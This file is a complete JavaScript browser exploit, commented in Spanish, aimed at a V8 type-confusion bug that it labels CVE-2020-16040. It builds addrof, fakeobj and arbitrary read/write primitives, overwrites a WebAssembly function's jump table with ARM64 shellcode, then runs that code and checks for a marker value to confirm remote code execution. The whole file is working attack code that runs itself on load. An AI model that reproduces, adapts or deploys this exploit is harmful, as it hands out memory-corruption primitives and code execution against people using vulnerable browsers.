function log(msg, type = 'info') {
   console.log(`[${type.toUpperCase()}] ${msg}`);
}


function ejecutarExploit() {
   // === STAGE 1: VULNERABILIDAD V8 (CVE-2020-16040) ===
   var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
   var wasm_mod = new WebAssembly.Module(wasm_code);
   var wasm_instance = new WebAssembly.Instance(wasm_mod);
   var f = wasm_instance.exports.main;


   var buf = new ArrayBuffer(8);
   var f64_buf = new Float64Array(buf);
   var u64_buf = new Uint32Array(buf);
   let buf2 = new ArrayBuffer(0x150);


   function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); }
   function itof(val) { u64_buf[0] = Number(val & 0xffffffffn); u64_buf[1] = Number(val >> 32n); return f64_buf[0]; }


   function foo(a) {
     var y = 0x7fffffff;
     if (a == NaN) y = NaN;
     if (a) y = -1;
     let z = y + 1; z >>= 31;
     z = 0x80000000 - Math.sign(z|1);
     if(a) z = 0;
     var arr = new Array(0-Math.sign(z));
     arr.shift();
     var cor = [1.1, 1.2, 1.3];
     return [arr, cor];
   }


   for(var i=0;i<0x3000;++i) foo(true);
   var x = foo(false);
   var arr = x[0]; var cor = x[1];
   const idx = 6;
   arr[idx+10] = 0x4242;


   function addrof(k) { arr[idx+1] = k; return ftoi(cor[0]) & 0xffffffffn; }
   function fakeobj(k) { cor[0] = itof(k); return arr[idx+1]; }


   var float_array_map = ftoi(cor[3]);
   var arr2 = [itof(float_array_map), 1.2, 2.3, 3.4];
   var fake = fakeobj(addrof(arr2) + 0x20n);


   function arbread(addr) {
       if (addr % 2n == 0) addr += 1n;
       arr2[1] = itof((2n << 32n) + addr - 8n);
       return (fake[0]);
   }


   function arbwrite(addr, val) {
       if (addr % 2n == 0) addr += 1n;
       arr2[1] = itof((2n << 32n) + addr - 8n);
       fake[0] = itof(BigInt(val));
   }


   function copy_shellcode(addr, shellcode) {
       let dataview = new DataView(buf2);
       let buf_addr = addrof(buf2);
       // CHROME 72: Offset 0x14 para backing store
       let backing_store_addr = buf_addr + 0x14n;
       arbwrite(backing_store_addr, addr);
       for (let i = 0; i < shellcode.length; i++) {
           dataview.setUint32(4*i, shellcode[i], true);
       }
   }


   // CHROME 72: Buscar entrypoint
   log("Buscando entrypoint...", "info");
  
   let f_addr = addrof(f);
   let sfi = ftoi(arbread(f_addr + 0x18n)) & 0xffffffffn;
   let func_data = ftoi(arbread(sfi + 0x8n)) & 0xffffffffn;
   let jt_offset = Number(ftoi(arbread(func_data + 0x20n)) & 0xffffffffn);
   let instance_ptr = ftoi(arbread(func_data + 0x10n)) & 0xffffffffn;
   let jt_start = ftoi(arbread(instance_ptr + 0x68n));
   let target_addr = jt_start + BigInt(jt_offset);
  
   log(`[+] Target: 0x${target_addr.toString(16)}`, "success");


   // === STAGE 2: FLAG ===
   var flag_buffer = new ArrayBuffer(8);
   var flag_view = new BigUint64Array(flag_buffer);
   flag_view[0] = 0x0n;
  
   // CHROME 72: Offset 0x14
   var flag_obj_addr = addrof(flag_buffer);
   var flag_backing_store = ftoi(arbread(flag_obj_addr + 0x14n));
  
   log(`[+] Flag @ 0x${flag_backing_store.toString(16)}`, "info");


   // === STAGE 3: SHELLCODE ===
   var addr_low = Number(flag_backing_store & 0xffffffffn);
   var addr_high = Number(flag_backing_store >> 32n);
  
   var shellcode = [
       0x58000060,
       0x58000081,
       0xf9000020,
       0xd65f03c0,
       0xd503201f,
       0xCAFEBABE,
       0xDEADBEEF,
       addr_low,
       addr_high
   ];
  
   log("[*] Inyectando...", "warning");
   copy_shellcode(target_addr, shellcode);


   // === STAGE 4: EJECUCIÓN ===
   try {
       f();
       log("[+] Retornó", "success");
   } catch(e) {
       log(`[!] ${e.message}`, "error");
   }
  
   // Verificar
   if(flag_view[0] === 0xDEADBEEFCAFEBABEn) {
       log("[+] ¡RCE CONFIRMADO!", "success");
       alert("ÉXITO: 0x" + flag_view[0].toString(16));
   } else {
       log(`[-] Flag: 0x${flag_view[0].toString(16)}`, "error");
   }
}


ejecutarExploit();